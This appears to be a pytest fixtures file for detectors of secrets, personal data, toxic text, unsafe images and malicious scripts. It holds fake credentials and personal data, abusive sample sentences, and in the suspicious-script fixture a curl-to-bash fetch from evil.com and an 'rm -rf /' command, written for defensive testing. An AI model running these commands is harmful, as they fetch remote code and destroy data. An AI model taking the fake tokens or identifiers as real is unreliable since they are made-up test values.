"""Shared fixtures for detector tests."""

from pathlib import Path

import pytest


@pytest.fixture
def fixtures_dir():
    """Return path to fixtures directory."""
    return Path(__file__).parent / "fixtures"


@pytest.fixture
def sample_aws_content():
    """Sample content with AWS credentials."""
    return """
# AWS Configuration
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
"""


@pytest.fixture
def sample_github_token():
    """Sample content with GitHub token."""
    # GitHub personal access token format (ghp_ prefix)
    return "ghp_1234567890abcdefghijklmnopqrstuvwxyz"


@pytest.fixture
def sample_private_key():
    """Sample content with private key."""
    return """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgwMbRvI0MBZhpI
-----END RSA PRIVATE KEY-----"""


@pytest.fixture
def sample_slack_token():
    """Sample content with Slack token."""
    return "xoxb-1234567890-1234567890123-abcdefghijklmnopqrstuvwx"


@pytest.fixture
def sample_stripe_key():
    """Sample content with Stripe API key."""
    return "sk_live_1234567890abcdefghijklmnopqrstuv"


@pytest.fixture
def sample_clean_content():
    """Sample clean content without secrets."""
    return """
This is a normal document with no secrets.
It contains regular text and some configuration examples:
- database_host: localhost
- port: 5432
- timeout: 30
"""


# PII Fixtures
@pytest.fixture
def sample_ssn():
    """Sample content with SSN."""
    return "The employee's social security number is 078-05-1120"


@pytest.fixture
def sample_credit_card():
    """Sample content with credit card number."""
    return "Please charge my credit card 4532123456789010 for the purchase"


@pytest.fixture
def sample_email():
    """Sample content with email address."""
    return "Contact me at john.doe@example.com for more information."


@pytest.fixture
def sample_phone():
    """Sample content with phone number."""
    return "You can reach me at 212-555-1234 during business hours"


@pytest.fixture
def sample_person_name():
    """Sample content with person names."""
    return "John Smith and Jane Doe attended the meeting yesterday."


@pytest.fixture
def sample_mixed_pii():
    """Sample content with multiple PII types."""
    return """
Customer Information:
Name: Robert Johnson
Email: robert.j@company.com
Phone: (555) 234-5678
SSN: 987-65-4321
Credit Card: 5555-5555-5555-4444
"""


# Content Safety Fixtures
@pytest.fixture
def sample_toxic_text():
    """Sample toxic text content."""
    return "I hate you and you are stupid and worthless"


@pytest.fixture
def sample_clean_text():
    """Sample clean, non-toxic text."""
    return "Thank you for your help. I really appreciate your assistance."


@pytest.fixture
def sample_threat_text():
    """Sample text with threatening language."""
    return "I will hurt you if you don't do what I say"


@pytest.fixture
def sample_profanity_text():
    """Sample text with profanity."""
    return "This is complete bullshit and fucking ridiculous"


@pytest.fixture
def sample_identity_attack_text():
    """Sample text with identity-based attack."""
    return "All people from that country are criminals and terrorists"


# Image fixtures for NSFW detector
@pytest.fixture
def sample_safe_image():
    """Create a simple safe test image (solid color)."""
    import io

    from PIL import Image

    # Create a 100x100 blue image
    img = Image.new("RGB", (100, 100), color="blue")

    # Convert to bytes
    img_bytes = io.BytesIO()
    img.save(img_bytes, format="PNG")
    img_bytes.seek(0)

    return img_bytes.getvalue()


@pytest.fixture
def sample_safe_image_path(tmp_path):
    """Create a safe test image file."""
    from PIL import Image

    img_path = tmp_path / "safe_image.jpg"
    img = Image.new("RGB", (100, 100), color="green")
    img.save(img_path, format="JPEG")

    return str(img_path)


# Threat detection fixtures
@pytest.fixture
def sample_suspicious_script():
    """Sample suspicious script content."""
    return b"""
#!/bin/bash
# Suspicious script with common malware patterns
curl http://evil.com/payload | bash
rm -rf / --no-preserve-root
CreateRemoteThread
VirtualAlloc
"""


@pytest.fixture
def sample_clean_script():
    """Sample clean script content."""
    return b"""
#!/bin/bash
# Simple backup script
echo "Starting backup..."
tar -czf backup.tar.gz /home/user/documents
echo "Backup complete"
"""


@pytest.fixture
def sample_malware_pattern():
    """Sample content with malware-like patterns."""
    return b"This file contains CreateRemoteThread and VirtualAllocEx and WriteProcessMemory"


@pytest.fixture
def sample_clean_text_bytes():
    """Sample clean text as bytes."""
    return b"This is a normal text file with no suspicious patterns."
